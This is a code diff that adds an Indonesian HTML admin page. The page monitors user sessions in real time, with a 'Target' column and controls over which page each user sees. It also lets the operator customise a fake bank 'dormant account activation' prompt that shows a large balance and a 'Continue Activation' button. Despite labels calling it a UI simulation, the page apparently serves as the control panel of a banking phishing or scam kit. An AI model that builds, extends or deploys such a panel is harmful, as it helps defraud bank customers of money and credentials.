@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <title>Admin — Control Center</title>
+  <link rel="stylesheet" href="admin.css">
+</head>
+<body>
+<div class="shell">
+  <aside>
+    <div class="brand">ADMIN PANEL</div>
+    <nav>
+      <button class="nav-tab active" data-view="sessions">User Sessions</button>
+      <button class="nav-tab" data-view="appearance">Tampilan Web</button>
+      <button class="nav-tab" data-view="dormant">Notif Dormant</button>
+    </nav>
+    <button id="logout" class="logout">Keluar</button>
+  </aside>
+
+  <main>
+    <section id="view-sessions" class="admin-view active-view">
+      <header>
+        <div><h1>Realtime User Sessions</h1><p>Pantau posisi user dan atur halaman workflow yang aman.</p></div>
+        <button id="refresh">Segarkan</button>
+      </header>
+      <section class="stats">
+        <article><span>Total User</span><strong id="total">0</strong></article>
+        <article><span>Online</span><strong id="online">0</strong></article>
+        <article><span>Target Aktif</span><strong id="targets">0</strong></article>
+      </section>
+      <section class="panel">
+        <div class="toolbar"><input id="search" type="search" placeholder="Cari user / nama / status"><span id="status">Memuat…</span></div>
+        <div class="tablewrap"><table><thead><tr><th>User</th><th>Status</th><th>Halaman sekarang</th><th>Last seen</th><th>Target</th><th>Aksi</th></tr></thead><tbody id="rows"></tbody></table></div>
+      </section>
+    </section>
+
+    <section id="view-appearance" class="admin-view" hidden>
+      <header>
+        <div><h1>Tampilan Web</h1><p>Atur tema simulasi tanpa mengubah struktur dan fitur utama website.</p></div>
+        <div class="header-actions"><button class="secondary-action" id="resetTheme">Reset Preview</button><button class="secondary-action danger-soft" id="restoreTheme">Gunakan Tampilan Asli</button><button id="saveTheme">Simpan Tampilan</button></div>
+      </header>
+      <div class="publish-state" id="themePublishState">Tampilan asli website AKTIF</div>
+      <div class="settings-grid">
+        <section class="panel settings-panel">
+          <div class="section-head"><h2>Warna & Proporsi</h2><p>Perubahan diterapkan melalui konfigurasi terpisah.</p></div>
+          <div class="form-grid">
+            <label>Warna Utama<div class="color-field"><input id="primaryColor" type="color"><input id="primaryColorText" maxlength="7"></div></label>
+            <label>Warna Sekunder<div class="color-field"><input id="secondaryColor" type="color"><input id="secondaryColorText" maxlength="7"></div></label>
+            <label>Background<div class="color-field"><input id="backgroundColor" type="color"><input id="backgroundColorText" maxlength="7"></div></label>
+            <label>Surface / Card<div class="color-field"><input id="surfaceColor" type="color"><input id="surfaceColorText" maxlength="7"></div></label>
+            <label>Warna Teks<div class="color-field"><input id="textColor" type="color"><input id="textColorText" maxlength="7"></div></label>
+            <label>Radius Card <strong id="radiusValue">20px</strong><input id="radius" type="range" min="8" max="32" step="1"></label>
+            <label>Skala Font <strong id="fontScaleValue">100%</strong><input id="fontScale" type="range" min="0.9" max="1.15" step="0.01"></label>
+          </div>
+        </section>
+        <aside class="preview-wrap">
+          <div class="preview-label">Preview simulasi</div>
+          <div id="themePreview" class="theme-preview">
+            <div class="preview-hero"><small>SIMULASI UI</small><h3>Selamat Datang Kembali.</h3><p>Preview perubahan warna dan proporsi.</p></div>
+            <div class="preview-card"><span>Contoh card</span><strong>Rp25.000.000</strong><button>Contoh Tombol</button></div>
+          </div>
+        </aside>
+      </div>
+    </section>
+
+    <section id="view-dormant" class="admin-view" hidden>
+      <header>
+        <div><h1>Notifikasi Dormant</h1><p>Atur tampilan notifikasi dormant untuk simulasi antarmuka.</p></div>
+        <div class="header-actions"><button class="secondary-action danger-soft" id="restoreDormant">Gunakan Dormant Asli</button><button id="saveDormant">Simpan Notifikasi</button></div>
+      </header>
+      <div class="publish-state" id="dormantPublishState">Dormant asli website AKTIF</div>
+      <div class="settings-grid">
+        <section class="panel settings-panel">
+          <div class="simulation-lock">SIMULASI UI — disclaimer simulasi pada website tetap aktif dan tidak dapat dimatikan dari Admin Panel.</div>
+          <div class="form-grid single">
+            <label>Warna Aksen Dormant<div class="color-field"><input id="dormantAccentColor" type="color"><input id="dormantAccentColorText" maxlength="7"></div></label>
+            <label>Judul Kartu<input id="dormantTitle" maxlength="72"></label>
+            <label>Badge Status<input id="dormantBadge" maxlength="48"></label>
+            <label>Deskripsi<textarea id="dormantDescription" maxlength="180" rows="3"></textarea></label>
+            <label>Judul Modal<input id="dormantModalTitle" maxlength="72"></label>
+            <label>Status Modal<input id="dormantModalStatus" maxlength="48"></label>
+            <label>Tombol Utama<input id="dormantPrimaryLabel" maxlength="48"></label>
+            <label>Tombol Kembali<input id="dormantSecondaryLabel" maxlength="48"></label>
+          </div>
+        </section>
+        <aside class="preview-wrap">
+          <div class="preview-label">Preview dormant</div>
+          <div id="dormantPreview" class="dormant-preview">
+            <div class="dormant-icon">🔐</div>
+            <h3 id="previewDormantTitle">Aktivasi Rekening Diperlukan</h3>
+            <span id="previewDormantBadge">Dormant • Belum Aktif</span>
+            <p id="previewDormantDescription">Rekening Anda memerlukan proses aktivasi dan verifikasi sebelum dapat melanjutkan layanan.</p>
+            <div class="sim-note">Simulasi antarmuka — tidak memproses transaksi, setoran, atau aktivasi rekening nyata.</div>
+            <button id="previewDormantButton">Lanjutkan Aktivasi</button>
+          </div>
+        </aside>
+      </div>
+    </section>
+
+    <div id="toast" role="status" aria-live="polite"></div>
+  </main>
+</div>
+<script src="admin.js"></script>
+</body>
+</html>
